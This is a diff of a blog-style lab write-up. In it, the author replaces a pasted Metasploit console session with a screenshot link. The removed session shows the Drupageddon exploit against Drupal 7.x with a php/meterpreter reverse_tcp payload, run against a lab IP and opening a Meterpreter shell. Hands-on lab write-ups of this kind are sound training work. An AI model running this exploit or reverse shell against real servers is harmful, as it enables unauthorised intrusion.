@@ -104,34 +104,14 @@ I also used Metasploit framework to search for any vulnerabilty that i can use t
 
 After looking for vulnerabilty on different database i decided to use an exploit found in metasploit to gain access to a meterpreter shell
 
-![Results of msf]
+![Results of msfpayload](https://github.com/Iboroaniekan/Iboroaniekan.github.io/blob/main/assets/images/msf%20payload.png?raw=true)
 
-I used a payload from metasploit on the target.
+Now i exploited the machine and got a meterpreter shell 
 
-  Payload options (php/meterpreter/reverse_tcp):
-
-   Name   Current Setting  Required  Description
-   ##LHOST                      yes      The listen address (an interface may be specified)
-   
-   ##LPORT     4444            yes      The listen port
-
-
-##Exploit target:
-
-  ##Id ##Name
-  
-   ##0   ##Drupal 7.0 - 7.31 (form-cache PHP injection method)
+![Results of msfpayload]
 
 
 
-View the full module info with the info, or info -d command.
-
-msf6 exploit(multi/http/drupal_drupageddon) > set rhosts 10.0.2.5
-rhosts => 10.0.2.5
-msf6 exploit(multi/http/drupal_drupageddon) > run
-[*] Started reverse TCP handler on :4444 
-[*] Sending stage (40004 bytes) to 10.0.2.5
-[*] Meterpreter session 1 opened (:4444 -> 10.0.2.5:50807) at 2025-08-21 13:01:57 +0100
 
 It worked! I got a low-level shell on the machine.
 
